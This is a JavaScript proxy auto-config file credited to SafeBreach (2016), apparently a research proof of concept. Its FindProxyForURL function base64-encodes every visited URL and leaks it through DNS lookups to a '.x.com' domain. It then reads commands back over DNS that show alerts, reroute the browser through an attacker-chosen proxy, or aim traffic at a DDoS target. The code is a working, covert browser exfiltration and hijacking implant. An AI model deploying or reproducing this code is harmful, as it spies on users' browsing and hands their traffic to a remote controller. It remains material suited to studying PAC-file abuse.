/*
 * Copyright (c) 2016, SafeBreach
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

var _version = "1.0";
var _author = "Itzik Kotler";
var _copyright = "Copyright 2016, SafeBreach";

/*
 * Configuration
 */

const DNS_KEY = '.x.com'

/*
 * DO NOT CHANGE ANYTHING BELOW THIS LINE UNLESS
 * YOU REALLY KNOW WHAT ARE YOU DOING :-)
 */

// Taken from https://gist.github.com/sevir/3946819

var _PADCHAR = "="
var _ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

function _getbyte64( s, i ) {
  var idx = _ALPHA.indexOf( s.charAt( i ) );

  if ( idx === -1 ) {
    throw "Cannot decode base64";
  }

  return idx;
}

function _decode( s ) {
  var pads = 0,
    i,
    b10,
    imax = s.length,
    x = [];

  s = String( s );

  if ( imax === 0 ) {
    return s;
  }

  if ( imax % 4 !== 0 ) {
    throw "Cannot decode base64";
  }

  if ( s.charAt( imax - 1 ) === _PADCHAR ) {
    pads = 1;

    if ( s.charAt( imax - 2 ) === _PADCHAR ) {
      pads = 2;
    }

    // either way, we want to ignore this last block
    imax -= 4;
  }

  for ( i = 0; i < imax; i += 4 ) {
    b10 = ( _getbyte64( s, i ) << 18 ) | ( _getbyte64( s, i + 1 ) << 12 ) | ( _getbyte64( s, i + 2 ) << 6 ) | _getbyte64( s, i + 3 );
    x.push( String.fromCharCode( b10 >> 16, ( b10 >> 8 ) & 0xff, b10 & 0xff ) );
  }

  switch ( pads ) {
    case 1:
      b10 = ( _getbyte64( s, i ) << 18 ) | ( _getbyte64( s, i + 1 ) << 12 ) | ( _getbyte64( s, i + 2 ) << 6 );
      x.push( String.fromCharCode( b10 >> 16, ( b10 >> 8 ) & 0xff ) );
      break;

    case 2:
      b10 = ( _getbyte64( s, i ) << 18) | ( _getbyte64( s, i + 1 ) << 12 );
      x.push( String.fromCharCode( b10 >> 16 ) );
      break;
  }

  return x.join( "" );
}

function _getbyte( s, i ) {
  var x = s.charCodeAt( i );

  if ( x > 255 ) {
    throw "INVALID_CHARACTER_ERR: DOM Exception 5";
  }

  return x;
}

function _encode( s ) {
  if ( arguments.length !== 1 ) {
    throw "SyntaxError: exactly one argument required";
  }

  s = String( s );

  var i,
    b10,
    x = [],
    imax = s.length - s.length % 3;

  if ( s.length === 0 ) {
    return s;
  }

  for ( i = 0; i < imax; i += 3 ) {
    b10 = ( _getbyte( s, i ) << 16 ) | ( _getbyte( s, i + 1 ) << 8 ) | _getbyte( s, i + 2 );
    x.push( _ALPHA.charAt( b10 >> 18 ) );
    x.push( _ALPHA.charAt( ( b10 >> 12 ) & 0x3F ) );
    x.push( _ALPHA.charAt( ( b10 >> 6 ) & 0x3f ) );
    x.push( _ALPHA.charAt( b10 & 0x3f ) );
  }

  switch ( s.length - imax ) {
    case 1:
      b10 = _getbyte( s, i ) << 16;
      x.push( _ALPHA.charAt( b10 >> 18 ) + _ALPHA.charAt( ( b10 >> 12 ) & 0x3F ) + _PADCHAR + _PADCHAR );
      break;

    case 2:
      b10 = ( _getbyte( s, i ) << 16 ) | ( _getbyte( s, i + 1 ) << 8 );
      x.push( _ALPHA.charAt( b10 >> 18 ) + _ALPHA.charAt( ( b10 >> 12 ) & 0x3F ) + _ALPHA.charAt( ( b10 >> 6 ) & 0x3f ) + _PADCHAR );
      break;
  }

  return x.join( "" );
}

// Taken from http://binnyva.blogspot.com/2005/10/dump-function-javascript-equivalent-of.html

function dump(arr,level) {
var dumped_text = "";
if(!level) level = 0;

//The padding given at the beginning of the line.
var level_padding = "";
for(var j=0;j<level+1;j++) level_padding += "    ";

if(typeof(arr) == 'object') { //Array/Hashes/Objects
 for(var item in arr) {
  var value = arr[item];

  if(typeof(value) == 'object') { //If it is an array,
   dumped_text += level_padding + "'" + item + "' ...\n";
   dumped_text += dump(value,level+1);
  } else {
   dumped_text += level_padding + "'" + item + "' => \"" + value + "\"\n";
  }
 }
} else { //Stings/Chars/Numbers etc.
 dumped_text = "===>"+arr+"<===("+typeof(arr)+")";
}
return dumped_text;
}

// Taken from https://stackoverflow.com/questions/18638900/javascript-crc32

function _makeCRCTable() {
    var c;
    var crcTable = [];
    for(var n =0; n < 256; n++){
        c = n;
        for(var k =0; k < 8; k++){
            c = ((c&1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1));
        }
        crcTable[n] = c;
    }
    return crcTable;
}

function crc32(str) {
    var crcTable = _makeCRCTable();
    var crc = 0 ^ (-1);

    for (var i = 0; i < str.length; i++ ) {
        crc = (crc >>> 8) ^ crcTable[(crc ^ str.charCodeAt(i)) & 0xFF];
    }

    return (crc ^ (-1)) >>> 0;
}

// Low Level I/O Functions

function _send_with_postfix(data) {
    return dnsResolve(data + '.' + Math.floor((Math.random() * 98) + 1) + DNS_KEY);
}

function send(channel, data) {
    var b64_data = _encode(data);
    var chunks = b64_data.match(/.{1,50}/g);
    var chunk_idx = 0;
    var dword_retval;
    _send_with_postfix('O' + '.' + channel + '.TC' + chunks.length);

    for (chunk_idx = 0; chunk_idx < chunks.length; chunk_idx++) {
        var j = _send_with_postfix('W' + '.' + channel + '.I' + chunk_idx + '.' + chunks[chunk_idx]);
    }

    dword_retval = _send_with_postfix('C' + '.' + channel + '.DL' + data.length);

    return dword_retval.split('.');
}

function recv(channel, trigger_idx, bufsize) {
    var buffer = "";
    var current_dword;
    var chunk_idx;

    for (chunk_idx = 0; chunk_idx < bufsize; chunk_idx += 4) {
        current_dword = _send_with_postfix('R' + '.' + channel + '.I' + trigger_idx + '.O' + chunk_idx);

        // Iterate over each byte
        dword_array = current_dword.split('.');
        for (byte_idx = 0; byte_idx < 4; byte_idx++) {
            if (dword_array[byte_idx] == "1")
                break
            // Convert from ord()'s and append to buffer
            buffer += String.fromCharCode(dword_array[byte_idx])
        }
    }

    return buffer;
}

// Entry Point

function FindProxyForURL(url, host) {
    var answer;
    var dword_retval;
    var channel = ("0" + crc32(url)).slice(-10);

    dword_retval = send(channel, url);

    //  BYTE #1        |  BYTE #2           |  BYTE #3         | BYTE #4
    // <RESPONSE CODE> | <RESPONSE BUFSIZE> | <RESPONSE INDEX> | IGNORE

    switch (parseInt(dword_retval[0])) {

        // PASS
        case 200:
            answer = "DIRECT";
            break;

        // OFFLINE
        case 201:
            answer = "PROXY 127.0.0.1"
            break;

        // ALERT
        case 202:
            msg = recv(channel, dword_retval[2], dword_retval[1]);
            alert(msg);
            answer = "PROXY 127.0.0.1"
            break;

        // DDoS
        case 203:
            ddos_target = recv(channel, dword_retval[2], dword_retval[1]);
            answer = "PROXY " + ddos_target + "; DIRECT";
            break;

        // HIJACK
        case 204:
            proxy_str = recv(channel, dword_retval[2], dword_retval[1]);
            answer = "PROXY " + proxy_str;
            break;
     }

    return answer;
}
